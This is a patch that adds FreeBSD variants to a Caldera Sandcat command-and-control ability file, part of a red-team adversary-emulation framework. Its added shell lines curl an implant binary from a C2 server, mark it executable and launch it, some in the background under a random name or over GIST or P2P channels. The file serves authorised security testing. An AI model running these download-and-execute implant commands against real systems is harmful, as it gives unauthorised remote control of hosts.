@@ -1,0 +1,45 @@
+--- plugins/sandcat/data/abilities/command-and-control/2f34977d-9558-4c12-abad-349716777c6b.yml.orig	2022-07-20 19:48:00 UTC
++++ plugins/sandcat/data/abilities/command-and-control/2f34977d-9558-4c12-abad-349716777c6b.yml
+@@ -80,6 +80,42 @@
+               curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+               chmod +x #{agents.implant_name};
+               ./#{agents.implant_name} -server $server -listenP2P -v
++    freebsd:
++      sh:
++        command: |
++          server="#{app.contact.http}";
++          curl -s -X POST -H "file:sandcat.go" -H "platform:freebsd" $server/file/download > #{agents.implant_name};
++          chmod +x #{agents.implant_name};
++          ./#{agents.implant_name} -server $server -group red -v
++        variations:
++          - description: Deploy as a blue-team agent instead of red
++            command: |
++              server="#{app.contact.http}";
++              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:freebsd" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
++              nohup ./$agent -server $server -group blue &
++          - description: Download with a random name and start as a background process
++            command: |
++              server="#{app.contact.http}";
++              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:freebsd" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
++              nohup ./$agent -server $server &
++          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
++            command: |
++              server="#{app.contact.http}";
++              curl -s -X POST -H "file:sandcat.go" -H "platform:freebsd" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
++              chmod +x #{agents.implant_name};
++              ./#{agents.implant_name} -server $server -group red -v
++          - description: Download with GIST C2
++            command: |
++              server="#{app.contact.http}";
++              curl -s -X POST -H "file:sandcat.go" -H "platform:freebsd" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
++              chmod +x #{agents.implant_name};
++              ./#{agents.implant_name} -c2 GIST -v
++          - description: Deploy as a P2P agent with known peers included in compiled agent
++            command: |
++              server="#{app.contact.http}";
++              curl -s -X POST -H "file:sandcat.go" -H "platform:freebsd" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
++              chmod +x #{agents.implant_name};
++              ./#{agents.implant_name} -server $server -listenP2P -v            
+     windows:
+       psh:
+         command: |
